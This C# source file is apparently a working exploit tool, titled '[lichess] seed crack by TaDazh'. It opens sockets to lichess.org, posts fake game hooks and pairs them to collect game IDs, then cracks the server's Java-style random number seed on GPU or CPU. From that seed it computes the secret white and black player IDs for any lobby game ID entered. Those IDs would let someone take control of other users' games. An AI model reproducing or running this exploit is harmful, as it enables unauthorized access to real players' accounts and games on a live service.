using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Globalization;
using System.IO.Compression;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.IO;

namespace lichess_crack
{
    internal class Entry
    {
        internal static long CrackSeed(bool preferGpu)
        {
            Cracker cracker = new Cracker(0x5DEECE66DL, 0xBL);
            Dictionary<string, string> seekData = new Dictionary<string, string>();
            seekData.Add("variant", "1");
            seekData.Add("timeMode", "1");
            seekData.Add("time", "1");
            seekData.Add("increment", "0");
            seekData.Add("days", "1");
            seekData.Add("mode", "0");
            seekData.Add("color", "white");

            StrongSocket player1 = new StrongSocket("/lobby/socket/v1", 0, null);
            StrongSocket player2 = new StrongSocket("/lobby/socket/v1", 0, null);
            Console.WriteLine("Created socket exploits.");

            Console.Write("Connecting sockets...");
            Task<bool> con1 = player1.Connect();
            Task<bool> con2 = player2.Connect();
            Task.WaitAll(con1, con2);
            Console.WriteLine("Done.");

            Console.Write("Checking Gpu Capabilities...");
            bool useGpu = Gpu.Init() && preferGpu;
            Console.WriteLine("Done.");
            Stopwatch sw = Stopwatch.StartNew();
            long seed = -1;
            int pass = 1;
            do
            {
                Console.Write("[Pass {0}] Posting fake hook...", pass);
                string query = Http.ToQuery(seekData);

                CookieCollection anonCookies = new CookieCollection();
                HttpWebResponse result = Http.Post(string.Format("http://{0}.lichess.org/setup/hook/{1}", CultureInfo.CurrentCulture.TwoLetterISOLanguageName, player1.Sri), query, Http.Accept.None, anonCookies);
                if (result == null)
                {
                    Console.WriteLine("Fail.");
                    Console.WriteLine("Lichess routes have changed.");
                    break;
                }

                Console.WriteLine("Done");
                Task<bool> join;
                byte[] buf = new byte[8192];
                using (GZipStream rdr = new GZipStream(result.GetResponseStream(), CompressionMode.Decompress))
                {
                    int len = rdr.Read(buf, 0, buf.Length);
                    string res = Encoding.ASCII.GetString(buf, 0, len);
                    JObject json = (JObject)JsonConvert.DeserializeObject(res);

                    string hookId = json["hook"]["id"].ToString();
                    join = player2.Send("join", hookId);
                }

                result.Dispose();
                result = null;

                Console.Write("[Pass {0}] Waiting for pairing...", pass);
                StrongSocket.Event e1 = player1.Listen("redirect");
                StrongSocket.Event e2 = player2.Listen("redirect");

                JObject j1 = player1.On(e1);
                JObject j2 = player2.On(e2);     
                player2.Send("abort").Wait();
                Console.WriteLine("Done.");

                if (j1 == null || j2 == null)
                {
                    Console.WriteLine("Failed.");
                    break;
                }

                string white = j1["d"]["id"].Value<string>();
                string black = j2["d"]["id"].Value<string>();
                string target = string.Format("{0}{1}{2}", white.Substring(8), black.Substring(8), white.Substring(0, 8));
                int[] sequence = Cracker.ConvertAlphanumeric(target);
                if (useGpu)
                {
                    Console.Write("[Pass {0}] Cracking sequence using GPU...", pass);
                    seed = cracker.CrackGpu(sequence);
                    Console.WriteLine("Done.", pass);
                }
                else
                {
                    Console.Write("[Pass {0}] Cracking sequence using CPU...", pass);
                    seed = cracker.CrackCpu(sequence, 16);
                    Console.WriteLine("Done.", pass);
                }

                Console.WriteLine("[Pass {0}] Finished pass.", pass);
                pass++;
            }
            while (seed == -1);
            sw.Stop();

            if (seed != -1)
            {
                Console.WriteLine("Seed -> {0}", seed);
            }

            Console.Write("Diposing resources...");
            Gpu.Dispose();

            player1.Dispose();
            player2.Dispose();
            Console.WriteLine("Done.");
            return seed;
        }

        internal static void Main(string[] args)
        {
            const bool preferGPU = true;
            const bool saveSeed = true;

            Console.Title = "[lichess] seed crack by TaDazh";

            long seed = -1;
            bool crackSeed = true;
            string seedFile = Path.Combine(Environment.CurrentDirectory, "seed.bin");
            if (File.Exists(seedFile))
            {
                string seedContents = File.ReadAllText(seedFile);
                if (long.TryParse(seedContents, out seed))
                {
                    crackSeed = false;
                }
            }

            if (crackSeed)
            {
                seed = CrackSeed(preferGPU);
                if (saveSeed)
                {
                    File.WriteAllText(seedFile, seed.ToString());
                }
            }

            Cracker cracker = new Cracker(0x5DEECE66DL, 0xBL);
            Console.Write("Id:");  
            string gameId = Console.ReadLine();

            string whiteId = null, blackId = null;
            if (gameId.Length == 8)
            {
                cracker.GetPlayerIdsForward(seed, gameId, out whiteId, out blackId, 5);
                if (whiteId == null || blackId == null)
                {
                    cracker.GetPlayerIdsBackward(seed, gameId, out whiteId, out blackId, 5);
                }
            }
            else
            {
                Console.WriteLine("\"{0}\" is not a gameid.", gameId);
                Console.WriteLine("Press any key to exit.");
                Console.ReadKey();
                return;
            }

            if (whiteId == null || blackId == null)
            {
                Console.WriteLine("\"{0}\" was not producable.", gameId);
                Console.WriteLine("1) Lichess has a new seed.");
                Console.WriteLine("2) The id suplied was not from a lobby game.");
                Console.WriteLine("Press any key to exit.");
                Console.ReadKey();
                return;
            }

            Console.WriteLine("White = {0}{1}", gameId, whiteId);
            Console.WriteLine("Black = {0}{1}", gameId, blackId);     
            Console.WriteLine("Press any key to exit.");
            Console.ReadKey();
        }
    }
}
